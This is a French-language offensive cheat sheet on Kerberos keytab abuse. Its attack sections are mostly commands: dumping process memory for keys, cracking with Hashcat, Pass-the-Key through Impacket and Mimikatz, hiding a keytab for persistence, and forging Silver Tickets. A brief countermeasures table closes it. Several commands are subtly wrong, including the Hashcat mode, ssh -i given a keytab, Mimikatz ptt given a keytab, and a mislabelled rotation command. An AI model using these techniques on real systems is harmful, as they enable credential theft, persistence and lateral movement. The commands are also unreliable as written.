Ce document détaille l'utilisation et l'exploitation des fichiers **Keytab** dans le cadre d'une authentification **Kerberos**.

```mermaid
flowchart LR
    A[Fichier Keytab] --> B{Extraction}
    B --> C[kinit / Authentification]
    C --> D[Ticket TGT]
    D --> E[Accès Service / Pass-the-Key]
    E --> F[Silver Ticket]
```

> [!danger]
> Le fichier **keytab** contient des clés secrètes en clair, il doit être traité comme un mot de passe.

> [!warning]
> L'utilisation de **GSSAPI** avec délégation de crédits peut exposer les credentials de l'utilisateur sur le serveur distant.

> [!note]
> L'horloge système doit être synchronisée avec le **KDC** pour que l'authentification **Kerberos** fonctionne.

> [!info]
> Le compte de service doit avoir un **SPN** valide pour que les attaques de type **Silver Ticket** fonctionnent.

## Localisation des Fichiers Keytab

### Linux
```bash
ls -l /etc/krb5.keytab
```

### Windows (MIT Kerberos)
```powershell
dir C:\ProgramData\MIT\Kerberos5\krb5.keytab
```

### Active Directory
```powershell
dir \\DOMAIN_CONTROLLER\c$\Windows\krb5.keytab
```

## Méthodes de récupération de keytab sur des systèmes compromis (ex: dump de mémoire)

Sur des systèmes Linux, les fichiers keytab sont souvent stockés sur le disque, mais peuvent être extraits de la mémoire si un processus les utilise activement.

### Extraction via dump mémoire (LiME/Volatility)
```bash
# Après avoir acquis le dump mémoire (mem.dump)
volatility -f mem.dump --profile=LinuxProfile linux_find_file -F /etc/krb5.keytab
```

### Extraction via processus en cours (GDB)
Si un processus utilise un keytab, il est possible de dumper la mémoire du processus pour récupérer les clés.
```bash
gcore -o process_dump <PID>
strings process_dump | grep -i "krb5"
```

## Analyse forensique des fichiers keytab (extraction des hashs NTLM/AES)

L'analyse permet de vérifier les types de chiffrement supportés et d'extraire les clés pour tenter un cassage hors-ligne.

### Analyse de la structure
```bash
ktutil
rkt /etc/krb5.keytab
list -e
```

### Extraction des hashs pour Hashcat
Utilisez `keytab2john` pour convertir le fichier en format exploitable par Hashcat.
```bash
python3 /opt/john/run/keytab2john.py /etc/krb5.keytab > keytab.hash
hashcat -m 13100 keytab.hash wordlist.txt
```

## Différences entre keytab v1 et v2

La version du fichier keytab détermine la compatibilité avec les outils d'administration et les bibliothèques Kerberos.

| Caractéristique | Keytab v1 | Keytab v2 |
| :--- | :--- | :--- |
| **Support** | Obsolète (très ancien) | Standard actuel |
| **En-tête** | 0x0501 | 0x0502 |
| **Support IPv6** | Non | Oui |
| **Flexibilité** | Limitée | Support étendu des types de chiffrement (AES) |

## Extraction et Affichage des Clés Keytab

### Affichage du contenu sous Linux
```bash
klist -k /etc/krb5.keytab
```

### Liste des services et utilisateurs
```bash
ktutil
rkt /etc/krb5.keytab
list
```

### Liste des clés sous Windows
```powershell
klist -k -t -K
```

### Exportation d'un Keytab pour un utilisateur
```bash
ktutil
addent -password -p user@DOMAIN.LOCAL -k 1 -e aes256-cts
wkt user.keytab
```

### Vérification de l'authentification
```bash
kinit -kt /etc/krb5.keytab user@DOMAIN.LOCAL
```

## Exploitation des Keytabs

Les fichiers **keytab** permettent des attaques de type **Pass-the-Key** en injectant les clés directement dans un processus **Kerberos**. Ces techniques sont étroitement liées à l'utilisation de la suite **Impacket** et aux concepts de **Pass-the-Ticket**.

### Authentification sans mot de passe
```bash
export KRB5_CLIENT_KTNAME=/etc/krb5.keytab
kinit -kt /etc/krb5.keytab user@DOMAIN.LOCAL
```

### Liste des tickets obtenus
```bash
klist
```

### Utilisation avec Impacket
```bash
python3 /opt/impacket/examples/smbclient.py -k -no-pass -keytab user.keytab DOMAIN.LOCAL
```

### Accès distant via SSH
```bash
ssh -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes -i user.keytab user@target.domain.com
```

### Pass-the-Key avec Mimikatz
```powershell
mimikatz.exe
kerberos::ptt /path/to/user.keytab
```

### Conversion en ticket .kirbi
```bash
python3 /opt/impacket/examples/ticketConverter.py user.keytab
```

## Techniques de persistence via keytab

Une fois les droits administrateur obtenus, le déploiement d'un keytab permet de maintenir un accès persistant sans modifier le mot de passe du compte.

### Création d'un keytab pour persistence
```bash
# Génération d'une clé pour un compte de service compromis
ktutil
addent -password -p svc_admin@DOMAIN.LOCAL -k 1 -e aes256-cts
wkt /var/tmp/.hidden.keytab
```

### Utilisation récurrente
L'attaquant peut utiliser ce fichier à tout moment pour obtenir un TGT valide sans interaction avec l'utilisateur légitime.
```bash
kinit -kt /var/tmp/.hidden.keytab svc_admin@DOMAIN.LOCAL
```

## Keytab Attack : Silver Ticket

Si un **keytab** lié à un compte de service est compromis, il est possible de forger un **Silver Ticket** pour accéder aux services cibles. Cette méthode repose sur la connaissance de la clé secrète du compte de service.

### Génération d'un Silver Ticket
```powershell
mimikatz.exe
kerberos::golden /user:service_account /domain:DOMAIN.LOCAL /sid:S-1-5-21-XXXX /target:server /service:cifs /aes256:AES_KEY_FROM_KEYTAB /ptt
```

### Connexion SMB
```powershell
dir \\target\c$
```

## Protection et Contre-Mesures

| Mesure | Commande / Action |
| :--- | :--- |
| Restreindre l'accès | `chmod 600 /etc/krb5.keytab` |
| Rotation des clés | `Set-ADServiceAccount -Identity "service_account" -PrincipalsAllowedToRetrieveManagedPassword "DOMAIN\Administrator"` |
| Détection usage | `index=windows EventCode=4769 (Ticket_Options=0x40810000 OR Ticket_Options=0x40800000)` |
| Surveillance GSSAPI | `journalctl -u sshd \| grep "GSSAPI"` |
| Suppression post-usage | `rm -f /etc/krb5.keytab` |

Pour approfondir ces vecteurs, consulter les notes sur **Kerberos Authentication**, **Pass-the-Ticket**, **Silver Ticket Attacks**, **Impacket Suite Usage** et **Active Directory Enumeration**.